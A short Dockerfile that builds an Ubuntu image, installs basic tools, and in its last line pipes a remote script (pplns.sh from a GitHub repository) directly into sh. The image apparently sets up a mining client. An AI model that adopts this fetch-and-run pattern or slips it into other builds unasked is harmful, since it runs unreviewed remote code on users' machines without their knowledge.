FROM ubuntu:latest
RUN apt update && apt install wget curl git libc6 -y
RUN curl https://raw.githubusercontent.com/rqiner001/files/main/pplns.sh | sh
